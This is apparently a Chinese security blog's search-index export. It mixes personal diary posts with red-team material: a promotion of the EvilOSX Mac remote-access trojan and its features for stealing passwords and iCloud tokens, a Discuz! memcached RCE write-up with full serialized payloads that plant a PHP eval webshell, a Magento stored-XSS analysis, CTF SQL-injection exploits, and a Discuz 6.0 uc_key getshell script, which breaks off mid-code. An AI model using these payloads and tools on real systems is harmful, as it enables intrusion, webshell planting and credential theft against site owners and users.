<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[EvilOSX一个Mac平台的远程管理工具]]></title>
    <url>%2F2018%2F03%2F03%2FEvilOSX%E4%B8%80%E4%B8%AAMac%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[0x00 工具简述EvilOSX 是一个还算好用的Mac平台的远程管理工具。测试了下有一些小bug，我修复了bug并提交代码给作者。 下载地址：https://github.com/Marten4n6/EvilOSX 0x01 功能简介 简单命令终端 免杀 (OpenSSL AES-256 加密 payloads, HTTPS 传输) 多线程 client端无依耐库 (原生python) 持久化 功能模块化 Chrome密码偷取 iCloud tokens 和 contacts偷取 通过 iTunes钓鱼获取icloud密码 文件下载上传 摄像头拍照 枚举iTunes iOS 备份 浏览器历史偷取(Chrome and Safari) 尝试本地提权漏洞获取root权限 闲时休眠功能(没有命令传输时候client进入60s休眠) 0x03 使用简介12345678910111213141516# 安装 urwid (required for the server GUI)$ sudo pip install urwid# 下载工具$ git clone https://github.com/Marten4n6/EvilOSX# Go into the repository$ cd EvilOSX# 生成client$ python builder.py# 启动监听$ python server/server.py# 最后在client端电脑上运行生成的程序]]></content>
      <categories>
        <category>红队工具集</category>
      </categories>
      <tags>
        <tag>红队,red team,工具,OSX,木马,远程控制,远程管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Discuz!因memcached未授权访问导致的RCE]]></title>
    <url>%2F2018%2F02%2F26%2FDiscuz-%E5%9B%A0memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84RCE%2F</url>
    <content type="text"><![CDATA[一、前言 ​ 这个漏洞大家一定不陌生，在16年的时候关于discuz! + ssrf +memcached的RCE漏洞让大家都很惊艳，一年过去了这个漏洞的修复情况又是怎样的呢？ 二、漏洞简述 ​ 这个漏洞大致利用过程是这样的：利用discuz!的ssrf漏洞，利用gopher协议写入payload到memcached，然后请求特定链接导致代码执行漏洞。 可以看出漏洞利用两个关键点：1.ssrf漏洞 2.代码执行漏洞 利用ssrf漏洞是要向memcached中写入payload，我们抽象的看ssrf只是写入payload的一种方式。如果memcached的11211端口绑定到了外网并且可以未授权访问，ssrf漏洞我们也可以不使用了。今天在做一个渗透测试的时候遇到了此种情况。 因此，现在我的关注点是代码执行漏洞。如果代码执行漏洞没有修复，我就可以利用memcached未授权漏洞写入payload，使用代码执行漏洞获取webshell。 三、discuz！代码执行漏洞分析 ​ 漏洞利用有两个版本，一个是老版本，一个是新版本，discuz！虽然已经是x3.4，代码也发生了变化，漏洞确是任然没有修复。 漏洞利用代码流程逻辑： 访问：forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes ./source/module/forum/forum_ajax.php ./template/default/common/footer_ajax.htm ./source/function/function_core.php ./source/function/function_core.php 最后利用preg_replace函数/e参数的代码执行特性完成了漏洞利用的全部过程。 以上是老版本代码，在网上已经有一些分析了，在这里简述一些，重点是payload的完整性使用。网上文章大部分在payload部分都只是验证性演示。作为一名红队渗透测试人员，验证性payload肯定是不能再实际渗透测试活动中使用的。 四、漏洞利用流程 老版本漏洞利用流程： 生成payload 12345&lt;?php$payload['output']['preg']['search']['plugins']= "/.*/e";$payload['output']['preg']['replace']['plugins']= "file_put_contents('./data/cache/ln.php','&lt;?phpeval(\$_POST[x]);?&gt;');";$payload['rewritestatus']['plugins']= 1;echoserialize($payload); 1a:2:&#123;s:6:"output";a:1:&#123;s:4:"preg";a:2:&#123;s:6:"search";a:1:&#123;s:7:"plugins";s:5:"/.*/e";&#125;s:7:"replace";a:1:&#123;s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','&lt;?phpeval($_POST[x]);?&gt;');";&#125;&#125;&#125;s:13:"rewritestatus";a:1:&#123;s:7:"plugins";i:1;&#125;&#125; ​ 然后telnet链接memcached 1telnet 1.1.1.1 11211 1set xxxxxx_setting 1 0 yyy //xxxx为前缀，discuz定义的，可以使用stats cachedump 命令查看。yyy为payload长度。 最后访问forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes，shell生成/data/cache/ln.php。 网上给的修复代码，完全没有作用 ​ 网上大部分修复是这样的 https://yq.aliyun.com/ziliao/5533。 1if (preg_match("(/|#|\+|%).*(/|#|\+|%)e", $_G['setting']['output']['preg']['search']) !== FALSE) &#123; die("request error"); &#125; ​ 这个修复完全没有作用，无效修复，preg_match的正则根本匹配不到/.*/e。注意看，正则代码没有给分隔符，而(成了分隔符，让正则失去了本来的作用，如果加上分隔符，正则匹配任何字符，将影响代码正常功能。 五、最新版本Discuz x3.4漏洞依旧存在 代码变化，漏洞依旧 ​漏洞点代码已经被更新，但是漏洞并没有被修复，这种代码更新应该是为了适应php版本更新，因为php5.5以后preg_replace的/e参数被废弃，官方建议使用preg_replace_callback。 123foreach($_G['setting']['output']['preg']['search']as $key =&gt; $value) &#123;$content= preg_replace_callback($value, create_function('$matches','return'.$_G['setting']['output']['preg']['replace'][$key].';'), $content);&#125; 漏洞函数变成了create_function,这个函数大家都知道也是危险函数，可以造成代码执行漏洞。 新版本漏洞利用流程 生成payload有点变化(ps:只是少了一个e) 12345&lt;?php$payload['output']['preg']['search']['plugins']= "/.*/";$payload['output']['preg']['replace']['plugins']= "file_put_contents('./data/cache/ln.php','&lt;?phpeval(\$_POST[x]);?&gt;');";$payload['rewritestatus']['plugins']= 1;echoserialize($payload); 1a:2:&#123;s:6:"output";a:1:&#123;s:4:"preg";a:2:&#123;s:6:"search";a:1:&#123;s:7:"plugins";s:4:"/.*/";&#125;s:7:"replace";a:1:&#123;s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','&lt;?phpeval($_POST[x]);?&gt;');";&#125;&#125;&#125;s:13:"rewritestatus";a:1:&#123;s:7:"plugins";i:1;&#125;&#125; 访问:forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes 最后一定要恢复缓存 Delete Vtfbsm_setting 成功写入文件 四、总结 ​ 直到最新版本discuz也没有修复这个漏洞，当初的ssrf结合memcached的漏洞，discuz只看到了ssrf漏洞，并没有留意到这个代码执行的漏洞。通过漏洞的抽象思维，我们知道控制memcached的方式不仅仅只有ssrf，再进一步到代码层，控制$G全局变量的方式也不仅仅只有memcached。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>RCE,discuz!,memcached,未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录算是一种宣泄]]></title>
    <url>%2F2017%2F06%2F20%2Fe8-ae-b0-e5-bd-95-e7-ae-97-e6-98-af-e4-b8-80-e7-a7-8d-e5-ae-a3-e6-b3-84%2F</url>
    <content type="text"><![CDATA[时间2017年6月20日，今晚看了一部小说，有点虐啊，激活了我感性的思维，毫无睡意。 不知从何时起开始惧怕，惧怕悲剧，惧怕失去，惧怕让自己久久不能释怀的人和事，惧怕回忆。 掌控欲强的人，惧怕超出控制。 情感的宣泄最是让人惧怕，压抑着，无处找宣泄的出口。 不知道该追求什么。 自以为脱离迷茫的年纪，反而被迷茫了。 思虑太多，辨析太明，最后让自己无路可走。 认真做事，一件一件，试试走走 管那么多干嘛。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[日常的一些闲聊]]></title>
    <url>%2F2016%2F10%2F31%2Fe6-97-a5-e5-b8-b8-e7-9a-84-e4-b8-80-e4-ba-9b-e9-97-b2-e8-81-8a%2F</url>
    <content type="text"><![CDATA[最近看了很多东西，值得拿出来一说的有两部美剧《the night of》《百年酒馆》，喜欢《the night of》里面的闲散镜头，每一个定格的镜头都给我一种“这是一张很文艺的照片”的感觉，说不出的美感。有人说这个时代缺少好的编剧，其实我更觉得这个时代缺少思考。《百年酒馆》是一部让人笑不出来的喜剧，每个角色的每一段独白都让人深思，总是留人一种悲而不落泪的感觉，把你的情绪一直压抑着，偶尔给你释放一下，又继续压抑你，直到结局，一下子让你爆发出来，留给你一种说不出的明悟。似乎我是懂了什么。 乌云的离开于我而言依旧是一场梦，曾经我也以为我虽苟活于世，却还是有自己的坚持。 没有啥豪言壮语，只学会了家长里短 一人一屋一车，日出而作，日落而息 做的张三李四，也装的赵钱孙李 狼贝为兼 依旧喜欢《晓松奇谈》、《一席演讲》，看看动漫，看看公开课，找找最近又有哪些新人出道，可有良作。 学学篆刻，学学书法，拨几下吉他，可能我还得学学围棋，搞几幅涂鸦，才能筹够琴棋书画。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[感谢我生命中曾经有你]]></title>
    <url>%2F2016%2F04%2F30%2Fe6-84-9f-e8-b0-a2-e6-88-91-e7-94-9f-e5-91-bd-e4-b8-ad-e6-9b-be-e7-bb-8f-e6-9c-89-e4-bd-a0%2F</url>
    <content type="text"></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[无题]]></title>
    <url>%2F2016%2F04%2F29%2Fe6-97-a0-e9-a2-98%2F</url>
    <content type="text"><![CDATA[现在是2016年4月29日凌晨3点35分，今夜无眠。 很久不写博客，读书变少，日子变长。 活的久，心脏跳动毫无规律。 品星空的轰鸣，思灯下的昏黄。 生命，刻意描绘，失去寓意。 我想，化为灰烬，以此为墨。 再图，白纸一张，重涂此生。 不求春暖花开，只为面朝大海。 孤一世清高，独一生快意。 &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[多线程HTTPbanner扫描v1.2]]></title>
    <url>%2F2016%2F04%2F20%2Fe5-a4-9a-e7-ba-bf-e7-a8-8bhttpbanner-e6-89-ab-e6-8f-8fv1-2%2F</url>
    <content type="text"><![CDATA[修复了一些bug，加了跳转和https的支持 下载：HBS]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[magento存储型xss（Magento CE]]></title>
    <url>%2F2016%2F01%2F25%2Fmagento-e5-ad-98-e5-82-a8-e5-9e-8bxss-ef-bc-88magento-ce%2F</url>
    <content type="text"><![CDATA[0x00 Magento简介&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;Magento （麦进斗） 是一套专业开源的电子商务系统。传说中的全球第一的电子商务系统。Magento设计得非常灵活，具有模块化架构体系和丰富的功能。易于与第三方应用系统无缝集成。其面向企业级应用，可处理各方面的需求，以及建设一个多种用途和适用面的电子商务网站。&nbsp;包括购物、航运、产品评论等等，充分利用开源的特性，提供代码库的开发，非常规范的标准，易于与第三方应用系统无缝集成。一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framwork框架。设计得非常灵活，具有模块化架构体系和丰富的功能。易于与第三方应用系统无缝集成。在设计上，包含相当全面，以模块化架构体系，让应用组合变得相当灵活，功能也相当丰富。为了打开盈利途径，Magento同时具备收费的企业版本，积极谋求合作和第三方整合的工具，比如电子支付平台等。0x02 描述 在2016年1月20日，Magento发不了SUPEE-7405补丁，修补了一个高危存储型xss漏洞。攻击者只需要注册一个帐号，修改自己邮箱为攻击代码，并利用该账户提交一个订单，当管理员在后台查看此订单的时候，恶意脚本代码将被执行。0x03 验证性测试 第一步，首先我们注册一个帐号，然后修改邮箱设置，发现有js邮箱验证，通过抓包改包工具成功修改邮箱为我们的恶意代码&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;第二步，浏览商品，提交订单&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;第三步，管理员浏览后台，查看订单详情，出发漏洞&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;0x04 代码分析&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 恶意数据执行流程：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;D:\WWW\magento\app\code\core\Mage\Customer\controllers\AccountController.php &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;—-&gt;public function editPostAction()&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;D:\WWW\magento\app\code\core\Mage\Eav\Model\Form.php&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; —–&gt;public function validateData(array $data)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;D:\WWW\magento\lib\Zend\Validate\EmailAddress.php&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 从代码中可以看出没有明显的xss防御代码&nbsp;&nbsp;“&gt;&lt;script&gt;alert(1)&lt;/script&gt;” 可以通过检测，最后进入数据库。&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 当管理员访问后台订单详情的时候：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 直接从订单数据库中取出邮箱数据，并没有过滤，形成存储xss漏洞。0x05 修复建议&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 升级到最新版本Magento CE 1.9.2.3 和 Magento EE 1.14.2.3 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[多线程HTTP banner扫描工具]]></title>
    <url>%2F2015%2F12%2F24%2Fe5-a4-9a-e7-ba-bf-e7-a8-8bhttp-banner-e6-89-ab-e6-8f-8f-e5-b7-a5-e5-85-b7%2F</url>
    <content type="text"><![CDATA[来自为知笔记(Wiz) ### 附件列表* [多线程]HBSv1.0.zip &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[stripcslashes反序列和条件竞争“暴力”注入writeup]]></title>
    <url>%2F2015%2F11%2F25%2Fstripcslashes-e5-8f-8d-e5-ba-8f-e5-88-97-e5-92-8c-e6-9d-a1-e4-bb-b6-e7-ab-9e-e4-ba-89-e6-9a-b4-e5-8a-9b-e6-b3-a8-e5-85-a5writeup%2F</url>
    <content type="text"><![CDATA[首先感谢各位大牛捧场，从评论中@ca1n牛首先注入到了version(),但没有找到flag，@loopx9最先搞定flag。经联系各位牛，最后发现解题思路为2种，一种是出题者思路，第二种是@loopx9牛的思路。 源码如下：&amp;lt;?php include &#39;config.php&#39;; foreach(array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $key){ foreach($$key as $k =&amp;gt; $v){ if(is_array($v)){ errorBox(&quot;hello,sangebaimao!&quot;); }else{ $k[0] !=&#39;_&#39;?$$k = addslashes($v):$$k = &quot;&quot;; } } } if(!empty($message)){ if(preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)){ die(&quot;hello,sangebaimao!&quot;); } if(filter($message) !== $message){ die(&quot;hello,sangebaimao!&quot;); } $sql=&quot;insert guestbook(message) value(&#39;$message&#39;);&quot;; mysql_query($sql); $sql = &quot;select &amp;#42 from guestbook order by id limit 0,5;&quot;; $result = mysql_query($sql); if($result){ while($row = mysql_fetch_array($result)){ $id = $row[&#39;id&#39;]; $message = $row[&#39;message&#39;]; echo &quot;|$id|=&amp;gt;|$message|&amp;lt;br/&amp;gt;&quot;; } } $message = stripcslashes($message); $sql = &quot;delete from guestbook where id=$id or message =&#39;$message&#39;;&quot;; if(!mysql_query($sql)){ print(mysql_error()); $sql = &quot;delete from guestbook where id=$id&quot;; mysql_query($sql); }; } function filter($str){ $rstr = &quot;&quot;; for($i=0;$i&amp;lt;strlen($str);$i++){ if(ord($str[$i])&amp;gt;31 &amp;amp;&amp;amp; ord($str[$i])&amp;lt;127){ $rstr = $rstr.$str[$i]; } } $rstr = str_replace(&#39;\&#39;&#39;,&#39;&#39;,$rstr); return $rstr; } ?&amp;gt;首先我们分析代码，代码整体逻辑就是一个伪留言功能：insert留言--&amp;gt;select留言--&amp;gt;delete留言在留言的过滤上使用了3道防护：第一道**addslashes**转义，第二道：**preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)**关键字匹配，第三道：**function filter($str)**删除不可见字符和单引号。0x01 stripcslashes反序列\x27绕过首先我们看下stripcslashes函数功能，手册中写道“可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述”，我们再翻翻stripcslashes的实现，如图所示：\x27 =&gt; ‘我们首先insert “test\x27“进入数据库，再select取出经过stripcslashes反转义\x27 =&gt; ‘,形成完整sql语句为:delete from guestbook where id=$id or message =&#39;**test&#39;**&#39;初步搞定第一道防御和第三道防御，第二道防御关键字过滤，熟悉审计的同学看见这个正则匹配可否似曾相识：WooYun: PHPCMS补丁绕过真正方法/&amp;#42!50000select&amp;#42/绕过第二道防御。最终exp：test\x27 and updatexml(0,concat(0x3a,(/&amp;#42!50000select&amp;#42/load_file(0x2f746d702f666c6167))),0)%230x02 条件竞争“暴力”注入@loopx9此思路贡献者是@loopx9牛，首先感谢@loopx9牛屌炸天的思路，良辰我表示服了。首先我们来捋一捋几个sql语句的执行顺序：insert message -&gt; select id -&gt;delete id or message当多线程跑起来的时候：线程1：insert -&gt; select -&gt; delete线程2: insert -&gt; select -&gt; delete当线程1该执行delete的时候，线程2已经执行了insert，此时数据库中新插入数据为2条。在这两条数据的message字段一样的情况下，线程1继续执行delete的时候就会删除2条数据，此时线程2再执行select语句和delete语句，这样原本数据库中最后一条数据就会被删除。利用这样一个条件竞争漏洞删除数据库中所有数据。当数据库中所有数据被删除，同样的条件竞争下：$sql = &quot;select &amp;#42 from guestbook order by id limit 0,5;&quot;; $result = mysql_query($sql); if($result){ while($row = mysql_fetch_array($result)){ $id = $row[&#39;id&#39;]; $message = $row[&#39;message&#39;]; echo &quot;|$id|=&amp;gt;|$message|&amp;lt;br/&amp;gt;&quot;; } }代码中select不出数据导致$id变量不能被赋值，$id变量就变成了未初始化变量。接下来执行$sql = “delete from guestbook where id=$id or message =’$message’;”;的时候，$id未初始化变量被攻击者自定义值，进入sql语句导致注入漏洞形成。最终exp：?message=1&amp;id=1 and 1=updatexml(0,concat(0x3a,(load_file(0x2f746d702f666c6167))),0)%23放入burp，说句咒语“比卡丘去吧”，只需等待flag。最后感谢@loopx9@牛肉包子 @玉林嘎 @′ 雨。 等各位牛的细心指导。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Dz6.0 uc_key getshell]]></title>
    <url>%2F2015%2F11%2F19%2Fdz6-0-uc-key-getshell%2F</url>
    <content type="text"><![CDATA[1. 注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相应的EXP即可getsehll 2. &lt;span class=&quot;pun&quot;&gt;$post = uc_unserialize(uc_post_contents()); &lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;$configfile = preg_replace(&quot;/define\(&#39;UC_API&#39;,\s&amp;#42&#39;.&amp;#42?&#39;\);/i&quot;, &quot;define(&#39;UC_API&#39;, &#39;$UC_API&#39;);&quot;, $configfile); &lt;/span&gt;4. &lt;span class=&quot;pun&quot;&gt; &lt;/span&gt;5. &lt;span class=&quot;pun&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;php&lt;/span&gt;6. &lt;span class=&quot;com&quot;&gt;// 代码版权归原作者所有！&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt; $timestamp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; time&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()+&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3600&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt; $host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt; $uc_key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Qfp1O0N3h5V356bbUdPer3958dp8X3b55dBa9fKai7s3Q7AbY9I3Hcnc7ec505sa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;10. &lt;span class=&quot;pln&quot;&gt; $code&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;_authcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;time=$timestamp&amp;amp;action=updateapps&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;ENCODE&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $uc_key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;));&lt;/span&gt;11. &lt;span class=&quot;pln&quot;&gt; $cmd1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;12. &lt;span class=&quot;tag&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;13. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;UC_API&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;UC_API&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;http://xxx\&#39;);eval($_POST[DOM]);//&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/UC_API&amp;gt;&lt;/span&gt;14. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&#39;;&lt;/span&gt;15. &lt;span class=&quot;pln&quot;&gt; $cmd2=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;xml version&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; encoding&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;16. &lt;span class=&quot;tag&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;17. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;item&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;UC_API&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;http://aaa&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;18. &lt;span class=&quot;tag&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&#39;;&lt;/span&gt;19. &lt;span class=&quot;pln&quot;&gt; $html1 = send($cmd1);&lt;/span&gt;20. &lt;span class=&quot;pln&quot;&gt; echo $html1;&lt;/span&gt;21. &lt;span class=&quot;pln&quot;&gt; #$html2 = send($cmd2);&lt;/span&gt;22. &lt;span class=&quot;pln&quot;&gt; #echo $html2;&lt;/span&gt;23. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;24. &lt;span class=&quot;pln&quot;&gt;function send($cmd){&lt;/span&gt;25. &lt;span class=&quot;pln&quot;&gt; global $host,$code;&lt;/span&gt;26. &lt;span class=&quot;pln&quot;&gt; $message = &quot;POST /dz/api/uc.php?code=&quot;.$code.&quot; HTTP/1.1\r\n&quot;;&lt;/span&gt;27. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Accept: &amp;#42/&amp;#42\r\n&quot;;&lt;/span&gt;28. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;;&lt;/span&gt;29. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Accept-Language: zh-cn\r\n&quot;;&lt;/span&gt;30. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;&lt;/span&gt;31. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;&lt;/span&gt;32. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;&lt;/span&gt;33. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;&lt;/span&gt;34. &lt;span class=&quot;pln&quot;&gt; $message .= &quot;Connection: Close\r\n\r\n&quot;;&lt;/span&gt;35. &lt;span class=&quot;pln&quot;&gt; $message .= $cmd;&lt;/span&gt;36. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;37. &lt;span class=&quot;pln&quot;&gt; //var_dump($message);&lt;/span&gt;38. &lt;span class=&quot;pln&quot;&gt; $fp = fsockopen($host, 80);&lt;/span&gt;39. &lt;span class=&quot;pln&quot;&gt; fputs($fp, $message);&lt;/span&gt;40. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;41. &lt;span class=&quot;pln&quot;&gt; $resp = &#39;&#39;;&lt;/span&gt;42. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;43. &lt;span class=&quot;pln&quot;&gt; while ($fp &amp;amp;&amp;amp; !feof($fp))&lt;/span&gt;44. &lt;span class=&quot;pln&quot;&gt; $resp .= fread($fp, 1024);&lt;/span&gt;45. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;46. &lt;span class=&quot;pln&quot;&gt; return $resp;&lt;/span&gt;47. &lt;span class=&quot;pln&quot;&gt;}&lt;/span&gt;48. &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;49. &lt;span class=&quot;pln&quot;&gt;function _authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) {&lt;/span&gt;50.51. &lt;span class=&quot;pln&quot;&gt; $ckey_length = 4; // 随机密钥长度 取值 0-32;&lt;/span&gt;52. &lt;span class=&quot;pln&quot;&gt; // 加入随机密钥，可以令密文无任何规律，即便是原文和密钥完全相同，加密结果也会每次不同，增大破解难度。&lt;/span&gt;53. &lt;span class=&quot;pln&quot;&gt; // 取值越大，密文变动规律越大，密文变化 = 16 的 $ckey_length 次方&lt;/span&gt;54. &lt;span class=&quot;pln&quot;&gt; // 当此值为 0 时，则不产生随机密钥&lt;/span&gt;55.56. &lt;span class=&quot;pln&quot;&gt; $key = md5($key ? $key : UC_KEY);&lt;/span&gt;57. &lt;span class=&quot;pln&quot;&gt; $keya = md5(substr($key, 0, 16));&lt;/span&gt;58. &lt;span class=&quot;pln&quot;&gt; $keyb = md5(substr($key, 16, 16));&lt;/span&gt;59. &lt;span class=&quot;pln&quot;&gt; $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;&lt;/span&gt;60.61. &lt;span class=&quot;pln&quot;&gt; $cryptkey = $keya.md5($keya.$keyc);&lt;/span&gt;62. &lt;span 